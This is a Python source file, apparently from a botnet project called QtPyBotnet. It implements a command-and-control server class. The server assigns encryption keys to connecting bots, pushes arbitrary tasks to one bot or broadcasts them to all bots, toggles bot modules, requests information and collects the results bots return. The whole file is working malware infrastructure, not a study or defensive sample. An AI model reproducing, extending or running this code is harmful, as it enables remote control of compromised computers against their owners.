import logging

from qtpy.QtCore import Slot, Signal, QTimer

from QtPyBotnet.models import Bot, Task, Module, Info
from QtPyNetwork.server import QBalancedServer
from QtPyBotnet.core.crypto import generate_key

from qasync import asyncSlot


class C2Server(QBalancedServer):
    """C2 server."""

    task = Signal(Task)
    module = Signal(Module)
    info = Signal(Info)
    assigned = Signal(int, str, int)

    def __init__(self):
        super(C2Server, self).__init__(loggerName=self.__class__.__name__)
        self.setDeviceModel(Bot)
        self.setObjectName("C2Server")
        self.logger = logging.getLogger(self.__class__.__name__)
        self.connected.connect(self.pre_connection)

    @asyncSlot(int, dict)
    async def on_message(self, bot_id: int, message: dict):
        """When server receives message from bot."""
        try:
            bot = self.getDeviceById(bot_id)
            bot_id = bot.get_id()
        except Exception as e:
            self.logger.error("Could not find bot with ID {}: {}".format(bot_id, e))
            return

        event_type = message.get("event_type")
        if event_type == "task":
            event = Task(bot_id, message.get("task_id"),
                         message.get("task"),
                         message.get("state"),
                         message.get("result"),
                         message.get("exit_code"))
            bot.on_task_received(event)
            self.task.emit(event)

        elif event_type == "module":
            event = Module(bot_id,
                           message.get("module"),
                           message.get("enabled"))
            bot.on_module_received(event)
            self.module.emit(event)

        elif event_type == "info":
            event = Info(bot_id,
                         message.get("info"),
                         message.get("state"),
                         message.get("results"))
            bot.on_info_received(event)
            self.info.emit(event)

        elif event_type == "assign":
            key = message.get("encryption_key")
            recv_id = message.get("bot_id")
            if key and int(bot_id) == recv_id:
                if key == bot.key:
                    key = str(key).encode()
                    self.setCustomKeyForClient(bot_id, key)
                    self.assigned.emit(bot_id, bot.ip, bot.port)
                else:
                    self.logger.warning("Assigned keys do not match! Bot {} will be kicked!".format(bot_id))
                    self.kick(bot_id)

        else:
            self.logger.error("BOT-{}: Failed to find matching event type for {}".format(bot.get_id(), message))
        self.message.emit(bot_id, message)

    @Slot(int, str, int)
    def pre_connection(self, bot_id, ip, port):
        key = generate_key().decode()
        self.getDeviceById(bot_id).set_custom_key(key)
        self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": key})

    @Slot(int, str)
    def send_task(self, bot_id: int, task: str):
        """Send task."""
        if bot_id == 0:
            for bot in self.bots:
                bot_id = bot.get_id()
                task_id = bot.get_next_task_id()
                task_obj = Task(bot_id, task_id, task, "queued")
                bot.on_task_received(task_obj)
                self.write(bot_id, task_obj.serialize())
        else:
            bot = self.getDeviceById(bot_id)
            if bot:
                task_id = bot.get_next_task_id()
                task_obj = Task(bot_id, task_id, task, "queued")
                bot.on_task_received(task_obj)
                self.write(bot_id, task_obj.serialize())
            else:
                self.logger.error("BOT-{} not found".format(bot_id))

    @Slot(int, str, bool)
    def send_module(self, bot_id: int, module_name: str, enabled: bool):
        """Send module state change request."""
        bot = self.getDeviceById(bot_id)
        module_obj = Module(bot_id, module_name, enabled)
        bot.on_module_received(module_obj)
        if bot_id == 0:
            self.writeAll(module_obj.serialize())
        else:
            self.write(bot_id, module_obj.serialize())

    @Slot(int, list)
    def send_info(self, bot_id: int, info: list):
        """Send info request."""
        bot = self.getDeviceById(bot_id)
        info_obj = Info(bot_id, info, "queued")
        bot.on_info_received(info_obj)
        if bot_id == 0:
            self.writeAll(info_obj.serialize())
        else:
            self.write(bot_id, info_obj.serialize())

    @Slot(int)
    def send_assign_message(self, bot_id):
        self.write(bot_id, {"event_type": "assign", "bot_id": bot_id, "encryption_key": generate_key().decode()})

    @Slot(int, dict)
    def send_after_connection_modules(self, bot_id: int, modules: dict):
        for module, enabled in modules.items():
            self.send_module(bot_id, module, enabled)

    @Slot(int, list)
    def send_after_connection_tasks(self, bot_id: int, tasks: list):
        for task in tasks:
            self.send_task(bot_id, task)

    @Slot(int, int)
    def stop_task(self, bot_id, task_id):
        self.write(bot_id, {"event_type": "task", "bot_id": bot_id, "event": "stop", "task_id": task_id})
